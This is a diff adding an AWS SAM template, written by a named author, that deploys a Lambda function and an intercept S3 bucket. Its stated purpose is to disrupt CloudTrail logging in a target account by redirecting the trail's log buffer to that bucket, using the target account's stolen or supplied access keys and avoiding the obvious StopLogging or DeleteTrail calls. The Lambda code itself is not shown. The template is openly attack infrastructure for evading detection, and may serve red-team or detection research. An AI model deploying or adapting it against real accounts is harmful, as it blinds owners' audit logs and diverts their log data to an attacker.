@@ -1,0 +1,102 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Transform: 'AWS::Serverless-2016-10-31'
+
+Description: |
+  SAM Application for disrupting CloudTrail logging without sending StopLogging or DeleteTrail.
+  Uses a handy "feature" where the CloudTrail buffer is sent to a different destination with the same Trail name.
+  Written by Scott Pack.
+
+Parameters:
+  TargetAccountKeyId:
+    Type: String
+    Description: Key ID within target account, tied to IAM User or Role with permissions to modify CloudTrail.
+    Default: "AKIA.... or ASIA...."
+  TargetAccountKeySecret:
+    Type: String
+    Description: Associated Key Secret
+    NoEcho: True
+    Default: ""
+  TargetAccountSessionToken:
+    Type: String
+    Description: Session Token, only needed if using an IAM Role rather than IAM User.
+    Default: ""
+    NoEcho: True
+
+Resources:
+  InterceptBucket:
+    Type: AWS::S3::Bucket
+
+  SSMIAMSecretKey:
+    Type: AWS::SecretsManager::Secret
+    Properties: 
+      Description: IAM Secret Key
+      SecretString: !Ref TargetAccountKeySecret
+
+  SSMIAMSessionToken:
+    Type: AWS::SecretsManager::Secret
+    Properties: 
+      Description: IAM Role Session Token
+      SecretString: !Ref TargetAccountSessionToken
+
+  InterceptBucketPolicy:
+    Type: AWS::S3::BucketPolicy
+    Properties: 
+      Bucket: !Ref InterceptBucket
+      PolicyDocument:
+        Statement:
+        - Action: 
+            - "s3:GetBucketAcl"
+            - "s3:PutObject"
+          Effect: "Allow"
+          Resource: 
+            - !GetAtt InterceptBucket.Arn
+            - !Join
+              - ""
+              - - !GetAtt InterceptBucket.Arn
+                - "/*"
+          Principal:
+            Service:
+              !Join
+                - ""
+                - - "cloudtrail."
+                  - !Ref AWS::URLSuffix
+
+  DisruptCloudTrailFunction:
+    Type: 'AWS::Serverless::Function'
+    Properties:
+      Handler: DisruptCloudtrail.lambda_handler
+      Runtime: python3.7
+      CodeUri: DisruptCloudtrail.py
+      Description: Lambda function to disrupt CloudTrail in a target account.
+      MemorySize: 128
+      Timeout: 300
+      Policies:
+        - Statement:
+          - Version: "2019-10-31"
+            Statement:
+            - Effect: "Allow"
+              Action:
+                - "sts.AssumeRole"
+              Resource: "*"
+          - Version: "2019-10-31"
+            Statement:
+            - Effect: "Allow"
+              Action:
+                - "ec2:DescribeRegions"
+              Resource: "*"
+          - Version: "2019-10-31"
+            Statement:
+            - Effect: "Allow"
+              Action:
+                - "secretsmanager:GetSecretValue"
+              Resource:
+                - !Ref SSMIAMSecretKey
+                - !Ref SSMIAMSessionToken
+        - S3CrudPolicy:
+            BucketName: !Ref InterceptBucket
+      Environment:
+        Variables: 
+          InterceptBucket: !Ref InterceptBucket
+          TargetAccountKeyId: !Ref TargetAccountKeyId
+          TargetAccountKeySecret: !Ref SSMIAMSecretKey
+          TargetAccountKeySession: !Ref SSMIAMSessionToken
